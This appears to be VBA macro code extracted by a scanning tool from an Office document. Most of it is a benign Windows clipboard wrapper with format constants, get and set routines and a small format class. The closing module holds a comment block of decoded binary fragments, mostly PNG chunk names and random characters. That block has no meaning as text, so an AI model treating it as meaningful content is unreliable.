Private Const GHND = (GMEM_MOVEABLE Or GMEM_ZEROINIT)    'Use for hwnd
Private Const NAME_MAX_LENGTH = 1024

Private Const APINULL = 0
Private Const CF_TEXT = 1    'Text format. Each line ends with a carriage return/linefeed (CR-LF) combination. A null character signals the end of the data. Use this format for ANSI text.
Private Const CF_BITMAP = 2    'A handle to a bitmap (HBITMAP).
Private Const CF_METAFILEPICT = 3    'Handle to a metafile picture format as defined by the METAFILEPICT structure. When passing a CF_METAFILEPICT handle by means of DDE, the application responsible for deleting hMem should also free the metafile referred to by the CF_METAFILEPICT handle.
Private Const CF_SYLK = 4    'Microsoft Symbolic Link (SYLK) format.
Private Const CF_TIFF = 6    'Tagged-image file format.
Private Const CF_DIF = 5    'Software Arts' Data Interchange Format.
Private Const CF_OEMTEXT = 7    'Text format containing characters in the OEM character set. Each line ends with a carriage return/linefeed (CR-LF) combination. A null character signals the end of the data.
Private Const CF_DIB = 8    'A memory object containing a BITMAPINFO structure followed by the bitmap bits.
Private Const CF_PALETTE = 9    'Handle to a color palette. Whenever an application places data in the clipboard that depends on or assumes a color palette, it should place the palette on the clipboard as well.
Private Const CF_PENDATA = 10    'Data for the pen extensions to the Microsoft Windows for Pen Computing.
Private Const CF_RIFF = 11    'Represents audio data more complex than can be represented in a CF_WAVE standard wave format.
Private Const CF_WAVE = 12    'Represents audio data in one of the standard wave formats, such as 11 kHz or 22 kHz PCM.
Private Const CF_UNICODETEXT = 13    'Unicode text format. Each line ends with a carriage return/linefeed (CR-LF) combination. A null character signals the end of the data.
Private Const CF_ENHMETAFILE = 14    'A handle to an enhanced metafile (HENHMETAFILE).
Private Const CF_HDROP = 15  'A handle to type HDROP that identifies a list of files. An application can retrieve information about the files by passing the handle to the DragQueryFile function.
Private Const CF_LOCALE = 16    'The data is a handle to the locale identifier associated with text in the clipboard. When you close the clipboard, if it contains CF_TEXT data but no CF_LOCALE data, the system automatically sets the CF_LOCALE format to the current input language. You can use the CF_LOCALE format to associate a different locale with the clipboard text.
Private Const CF_DIBV5 = 17    'A memory object containing a BITMAPV5HEADER structure followed by the bitmap color space information and the bitmap bits.
Private Const CF_DSPBITMAP = &H82    'Bitmap display format associated with a private format. The hMem parameter must be a handle to data that can be displayed in bitmap format in lieu of the privately formatted data.
Private Const CF_DSPENHMETAFILE = &H8E  'Enhanced metafile display format associated with a private format. The hMem parameter must be a handle to data that can be displayed in enhanced metafile format in lieu of the privately formatted data.
Private Const CF_DSPMETAFILEPICT = &H83    'Metafile-picture display format associated with a private format. The hMem parameter must be a handle to data that can be displayed in metafile-picture format in lieu of the privately formatted data.
Private Const CF_DSPTEXT = &H81    'Text display format associated with a private format. The hMem parameter must be a handle to data that can be displayed in text format in lieu of the privately formatted data.
Private Const CF_GDIOBJFIRST = &H300    'Start of a range of integer values for application-defined GDI object clipboard formats. The end of the range is CF_GDIOBJLAST.
Private Const CF_GDIOBJLAST = &H3FF    'See CF_GDIOBJFIRST.
Private Const CF_OWNERDISPLAY = &H80    'Owner-display format. The clipboard owner must display and update the clipboard viewer window, and receive the WM_ASKCBFORMATNAME, WM_HSCROLLCLIPBOARD, WM_PAINTCLIPBOARD, WM_SIZECLIPBOARD, and WM_VSCROLLCLIPBOARD messages. The hMem parameter must be NULL.
Private Const CF_PRIVATEFIRST = &H200    'Start of a range of integer values for private clipboard formats. The range ends with CF_PRIVATELAST. Handles associated with private clipboard formats are not freed automatically; the clipboard owner must free such handles, typically in response to the WM_DESTROYCLIPBOARD message.
Private Const CF_PRIVATELAST = &H2FF    'See CF_PRIVATEFIRST.

Public Property Get ClipboardFormatsAvailable() As Collection

    On Error GoTo ErrorHandler
    Dim thisClipboardFormat As Long
    Dim returnStringLength As Long
    Dim myCFAvailable As New Collection
    Dim clipBoardFormatName As String
    Dim ClipboardFormat As vbaClipboardFormat
    Dim success As Boolean

    success = OpenClipboard(0)

    If success Then
        thisClipboardFormat = 0
        thisClipboardFormat = EnumClipboardFormats(thisClipboardFormat)

        While thisClipboardFormat <> 0
            Set ClipboardFormat = New vbaClipboardFormat
            clipBoardFormatName = String$(NAME_MAX_LENGTH, vbNullChar)
            returnStringLength = GetClipboardFormatName(thisClipboardFormat, clipBoardFormatName, Len(clipBoardFormatName))
            clipBoardFormatName = TrimNull(clipBoardFormatName)
            If clipBoardFormatName = "" Then
                clipBoardFormatName = BuiltInClipboardFormatName(thisClipboardFormat)
            End If

            ClipboardFormat.Name = clipBoardFormatName
            ClipboardFormat.Number = thisClipboardFormat
            myCFAvailable.Add ClipboardFormat, ClipboardFormat.Name
            thisClipboardFormat = EnumClipboardFormats(thisClipboardFormat)
        Wend

        Set ClipboardFormatsAvailable = myCFAvailable
        CloseClipboard
    Else
        Set ClipboardFormatsAvailable = Nothing
    End If

    Exit Property

ErrorHandler:
    On Error Resume Next
    CloseClipboard
End Property

Public Function GetClipboardText(ByVal aClipboardFormatNumber As Long) As String
    'Do not handle errors - let them bubble up
    #If VBA7 Then
        Dim wLen As Integer, hMemory As LongPtr, hMyMemory As LongPtr, lpMemory As LongPtr, lpMyMemory As LongPtr
        Dim RetVal As Variant, haveMemoryLocked As Boolean, wClipAvail As Integer, szText As String, wSize As Long
    #Else
        Dim wLen As Integer, hMemory As Long, hMyMemory As Long, lpMemory As Long, lpMyMemory As Long
        Dim RetVal As Variant, haveMemoryLocked As Boolean, wClipAvail As Integer, szText As String, wSize As Long
    #End If

    Dim clipBoardText As String: clipBoardText = ""

    'Before accessing the clipboard, find out if the requested format is available
    If IsClipboardFormatAvailable(aClipboardFormatNumber) = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Requested clipboard format number " & aClipboardFormatNumber & " is not available on the clipboard."
        Exit Function
    End If

    Dim success As Boolean
    success = OpenClipboard(0)

    If success Then
        'Get a handle to a memory structure containing the clipboard data in the requested format
        hMemory = GetClipBoardData(aClipboardFormatNumber)
        CloseClipboard
        'If the handle is null, something went wrong
        If hMemory = APINULL Then
            'Throw an error
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to retrieve data from the Clipboard."
        End If

        wSize = GlobalSize(hMemory)    'The handle is good. How much data came back?

        clipBoardText = Space(wSize)    'Fill our destination string with nulls

        'Lock the memory
        'Get a pointer to the locked memory area
        lpMemory = GlobalLock(hMemory)

        If lpMemory = APINULL Then
            'CloseClipboard
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to lock clipboard memory."
        End If

        RetVal = lstrCpy(clipBoardText, lpMemory)     ' Copy the locked memory into our string
        GlobalUnlock hMemory    'Unlock memory

        ' Get rid of trailing stuff.
        clipBoardText = Trim(clipBoardText)
        GetClipboardText = TrimNull(clipBoardText)
    Else
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to open Clipboard. Perhaps some other application is using it."
    End If
End Function


Public Sub SetClipboardText(ByVal aText As String, ByVal aClipboardFormatName As String)
    #If VBA7 Then
        Dim wLen As Integer, hMemory As LongPtr, lpMemory As LongPtr, RetVal As Variant, memoryIsLocked As Boolean, memoryIsAllocated As Boolean, clipBoardIsOpen As Boolean
    #Else
        Dim wLen As Integer, hMemory As Long, lpMemory As Long, RetVal As Variant, memoryIsLocked As Boolean, memoryIsAllocated As Boolean, clipBoardIsOpen As Boolean
    #End If
    memoryIsAllocated = False: memoryIsLocked = False: clipBoardIsOpen = False
    On Error GoTo ErrorHandler

    wLen = Len(aText) + 1    ' Get the length, including one extra for a CHR$(0) at the end.
    aText = aText & Chr$(0)    'Add a null to the end
    hMemory = GlobalAlloc(GHND, wLen + 1)    'Allocate some memory

    If hMemory = APINULL Then
        Err.Raise vbObjectError + 1001, "vbaClipboard", "Unable to allocate memory."
    Else
        memoryIsAllocated = True
    End If

    lpMemory = GlobalLock(hMemory)
    If lpMemory = APINULL Then    'Throw an error
        Err.Raise vbObjectError + 1001, "vbaClipboard", "Unable to lock memory."
    Else
        memoryIsLocked = True
    End If


    RetVal = lstrCpy(lpMemory, aText)    ' Copy our string into the locked memory.
    RetVal = GlobalUnlock(hMemory)    ' Don't send clipboard locked memory.

    'If the preceding throws an error, it will be handled in ErrorHandler
    memoryIsLocked = True
    If OpenClipboard(0&) = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to open Clipboard. Perhaps some other application is using it."
    Else
        clipBoardIsOpen = True
    End If

    'Is the requested format one of the Windows built-in formats?
    Dim i As Integer, thisClipboardFormatNumber As Long
    thisClipboardFormatNumber = BuiltInClipboardFormatNumber(aClipboardFormatName)

    If thisClipboardFormatNumber = 0 Then
        'Nope. Register the format
        On Error Resume Next
        thisClipboardFormatNumber = RegisterClipboardFormat(aClipboardFormatName)
        If Err.Number <> 0 Then
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to register clipboard format: " & aClipboardFormatName & ". Error message: " & Err.Description
        End If
        On Error GoTo ErrorHandler

        If thisClipboardFormatNumber = 0 Then
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to register clipboard format: " & aClipboardFormatName
        End If
    End If

    'Empty the clipboard
    If EmptyClipboard() = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to empty the clipboard."
    End If

    If SetClipboardData(thisClipboardFormatNumber, hMemory) = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to set the clipboard data."
    End If

    CloseClipboard
    GlobalFree hMemory
    Exit Sub

ErrorHandler:

    Dim Description As String
    Description = Err.Description
    On Error Resume Next
    If memoryIsLocked Then GlobalUnlock hMemory
    If memoryIsAllocated Then GlobalFree hMemory
    If clipBoardIsOpen Then CloseClipboard
    On Error GoTo 0

    Err.Raise vbObjectError + 1, "vbaClipboard", Description
End Sub

Private Function TrimNull(ByVal aString As String) As String
    Dim nullAt As Long
    nullAt = InStr(1, aString, vbNullChar)
    If nullAt > 0 Then
        TrimNull = Left(aString, nullAt - 1)
    Else
        TrimNull = aString
    End If
End Function

Private Function BuiltInClipboardFormatNumber(ByVal aClipboardFormatName As String) As Long
    Dim result As Long
    Select Case UCase(aClipboardFormatName)
        Case "CF_TEXT": result = 1
        Case "CF_BITMAP": result = 2
        Case "CF_METAFILEPICT": result = 3
        Case "CF_SYLK": result = 4
        Case "CF_DIF": result = 5
        Case "CF_TIFF": result = 6
        Case "CF_OEMTEXT": result = 7
        Case "CF_DIB": result = 8
        Case "CF_PALETTE": result = 9
        Case "CF_PENDATA": result = 10
        Case "CF_RIFF": result = 11
        Case "CF_WAVE": result = 12
        Case "CF_UNICODETEXT": result = 13
        Case "CF_ENHMETAFILE": result = 14
        Case "CF_HDROP": result = 15
        Case "CF_LOCALE": result = 16
        Case "CF_DIBV5": result = 17
        Case "CF_DSPBITMAP": result = &H82
        Case "CF_DSPENHMETAFILE": result = &H8E
        Case "CF_DSPMETAFILEPICT": result = &H83
        Case "CF_DSPTEXT": result = &H81
        Case "CF_GDIOBJFIRST": result = &H300
        Case "CF_GDIOBJLAST": result = &H3FF
        Case "CF_OWNERDISPLAY": result = &H80
        Case "CF_PRIVATEFIRST": result = &H200
        Case "CF_PRIVATELAST": result = &H2FF
        Case Else: result = 0
    End Select
    BuiltInClipboardFormatNumber = result
End Function

Private Function BuiltInClipboardFormatName(ByVal aIndex As Integer) As String
    Select Case aIndex
        Case 1: BuiltInClipboardFormatName = "CF_TEXT"
        Case 2: BuiltInClipboardFormatName = "CF_BITMAP"
        Case 3: BuiltInClipboardFormatName = "CF_METAFILEPICT"
        Case 4: BuiltInClipboardFormatName = "CF_SYLK"
        Case 5: BuiltInClipboardFormatName = "CF_DIF"
        Case 6: BuiltInClipboardFormatName = "CF_TIFF"
        Case 7: BuiltInClipboardFormatName = "CF_OEMTEXT"
        Case 8: BuiltInClipboardFormatName = "CF_DIB"
        Case 9: BuiltInClipboardFormatName = "CF_PALETTE"
        Case 10: BuiltInClipboardFormatName = "CF_PENDATA"
        Case 11: BuiltInClipboardFormatName = "CF_RIFF"
        Case 12: BuiltInClipboardFormatName = "CF_WAVE"
        Case 13: BuiltInClipboardFormatName = "CF_UNICODETEXT"
        Case 14: BuiltInClipboardFormatName = "CF_ENHMETAFILE"
        Case 15: BuiltInClipboardFormatName = "CF_HDROP"
        Case 16: BuiltInClipboardFormatName = "CF_LOCALE"
        Case 17: BuiltInClipboardFormatName = "CF_DIBV5"
        Case &H82: BuiltInClipboardFormatName = "CF_DSPBITMAP"
        Case &H8E: BuiltInClipboardFormatName = "CF_DSPENHMETAFILE"
        Case &H83: BuiltInClipboardFormatName = "CF_DSPMETAFILEPICT"
        Case &H81: BuiltInClipboardFormatName = "CF_DSPTEXT"
        Case &H300: BuiltInClipboardFormatName = "CF_GDIOBJFIRST"
        Case &H3FF: BuiltInClipboardFormatName = "CF_GDIOBJLAST"
        Case &H80: BuiltInClipboardFormatName = "CF_OWNERDISPLAY"
        Case &H200: BuiltInClipboardFormatName = "CF_PRIVATEFIRST"
        Case &H2FF: BuiltInClipboardFormatName = "CF_PRIVATELAST"
    End Select
End Function

Attribute VB_Name = "vbaClipboardFormat"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

Private mNumber As Long
Private mName As String

Public Property Get Number() As Long
  Number = mNumber
End Property
Public Property Let Number(ByVal value As Long)
  mNumber = value
End Property

Public Property Get Name() As String
  Name = mName
End Property
Public Property Let Name(ByVal value As String)
  mName = value
End Property





Attribute VB_Name = "|fffd||fffd||fffd||fffd|1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' BzYG
' jZ 	
' "{-jYT
' 't)h
' zu)u
' RjjeyV
' "jTh
' /j)ZnW
' Z+.+-n
' "{h	
' l18c
' k<abi2
' V>VyV
' 3Qzd
' )wiqu6
' +]?Z9
' Stqt
' jlRlc
' w<Y5Y
' g\c0
' (=*ZT2
' %sIZ
' +xWk
' jtol
' 	mR6
' 67\sX
' H)>:vJy
' B/v-
' gAMA
'  cHRM
' IDATx
' ! D"V
' H%^3
' Q)CiFZ;H
' VW?MX
' h3A&
' IHDR
' tEXtSoftware
' Adobe ImageReadyq
' PB(4
' tf> " 
' <dF	2p
' z{1g5
' h=~|}2{
' 3^)g
' 55am
' IHDR
' tEXtSoftware
' Adobe ImageReadyq
' IDATx
' J[Ky
' or{}
' 3$CDd
' IEND
' IHDR
' bKGD
' 	pHYs
' 	vpAg
' IDAT8
' ^.A^EG
' OflU
' 9K?{}">@
' IHDR
' IDATx
' ]HSa
' p2sJbA
' H$?R
' N;k9g
' Q{.U=
' }}n:?
' }DX,
' ^& d
' IcM<
' 8gy%
' pi3Uj
' IEND
' IHDR
' 	pHYs
' MiCCPPhotoshop ICC profile
' wMjg
' *'v+b
' z{Gy
' 'tZ(
' "{-jYKj
' *'~*
' oxj(
' 't*'~(.

INQUEST-PP=macro
